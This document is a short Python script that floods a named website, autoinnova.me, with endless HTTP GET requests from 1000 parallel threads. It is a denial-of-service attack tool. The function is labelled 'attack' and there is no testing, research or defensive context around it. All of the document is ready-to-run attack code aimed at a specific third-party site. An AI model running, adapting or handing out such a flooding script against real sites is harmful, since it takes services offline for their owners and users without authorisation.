import requests
import threading

target = "https://autoinnova.me"
num_threads = 1000

def attack():
    while True:
        try:
            r = requests.get(target)
            print(f"Status: {r.status_code}")
        except Exception as e:
            print(f"Error: {e}")

for i in range(num_threads):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()

input("Press Enter to stop...\n")
